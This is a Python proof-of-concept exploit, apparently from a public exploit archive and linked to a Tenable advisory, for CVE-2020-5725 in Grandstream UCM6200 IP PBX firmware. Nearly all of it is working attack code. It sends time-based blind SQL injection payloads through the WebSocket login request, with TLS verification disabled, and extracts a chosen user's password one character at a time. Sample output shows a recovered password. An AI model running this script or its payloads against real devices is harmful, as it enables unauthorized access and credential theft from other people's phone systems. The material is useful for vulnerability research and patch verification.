# Exploit Title: Grandstream UCM6200 Series WebSocket 1.0.20.20 - 'user_password' SQL Injection
# Date: 2020-03-30
# Exploit Author: Jacob Baines
# Vendor Homepage: http://www.grandstream.com/
# Software Link: http://www.grandstream.com/support/firmware/ucm62xx-official-firmware
# Version: 1.0.20.20 and below
# Tested on: Grandstream UCM6202 1.0.20.20
# CVE : CVE-2020-5725
# Grandstream UCM6200 Series WebSocket 1.0.20.20 SQL Injection Password Disclosure via Login (time based)
# Advisory: https://www.tenable.com/security/research/tra-2020-17
# Sample output:
#
# albinolobster@ubuntu:~$ python3 websockify_login_injection.py --rhost 192.168.2.1 --user lolwat
# [+] Password length is 9
# [+] Discovering password...
# LabPass1%
# [+] Done! The password is LabPass1%

import sys
import ssl
import time
import asyncio
import argparse
import websockets

async def password_guess(ip, port, username):

    # the path to exploit
    uri = 'wss://' + ip + ':' + str(8089) + '/websockify'

    # no ssl verification
    ssl_context = ssl.SSLContext()
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False

    # determine the length of the password. The timeout is 10 seconds...
probably
    # way too long but whatever.
    length = 0
    while length < 100:
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            start = time.time()
            login =
'{"type":"request","message":{"transactionid":"123456789zxa","action":"login","username":"'
+ username + '\' AND LENGTH(user_password)==' + str(length) + ' AND
88=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2)))) or
\'1\'=\'2","token":"lolwat"}}'
            await websocket.send(login)
            response = await websocket.recv()

            if (time.time() - start) < 5:
                length = length + 1
                continue
            else:
                break

    # if we hit max password length than we've done something wrong
    if (length == 100):
        print('[+] Couldn\'t determine the passwords length.')
        sys.exit(1)

    print('[+] Password length is', length)
    print('[+] Discovering password...')

    # Now that we know the password length, just guess each password byte
until
    # we've reached the full length. Again timeout set to 10 seconds.
    password = ''
    while len(password) < length:
        value = 0x20
        while value < 0x80:
            if value == 0x22 or value == 0x5c:
                temp_pass = password + '\\'
                temp_pass = temp_pass + chr(value)
            else:
                temp_pass = password + chr(value)

            temp_pass_len = len(temp_pass)

            start = time.time()

            async with websockets.connect(uri, ssl=ssl_context) as
websocket:
                challenge =
'{"type":"request","message":{"transactionid":"123456789zxa","action":"login","username":"'
+ username + '\' AND user_password LIKE \'' + temp_pass +'%\' AND
substr(user_password,1,' + str(temp_pass_len) + ') = \'' + temp_pass + '\'
AND 88=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2)))) or
\'1\'=\'2","token":"lolwat"}}'
                await websocket.send(challenge)
                response = await websocket.recv()

            if (time.time() - start) < 5:
                value = value + 1
                continue
            else:
                print('\r' + temp_pass, end='')
                password = temp_pass
                break

        if value == 0x80:
            print('')
            print('[-] Failed to determine the password.')
            sys.exit(1)

    print('')
    print('[+] Done! The password is', password)

top_parser = argparse.ArgumentParser(description='')
top_parser.add_argument('--rhost', action="store", dest="rhost",
required=True, help="The remote host to connect to")
top_parser.add_argument('--rport', action="store", dest="rport", type=int,
help="The remote port to connect to", default=8089)
top_parser.add_argument('--user', action="store", dest="user",
required=True, help="The user to brute force")
args = top_parser.parse_args()

asyncio.get_event_loop().run_until_complete(password_guess(args.rhost,
args.rport, args.user))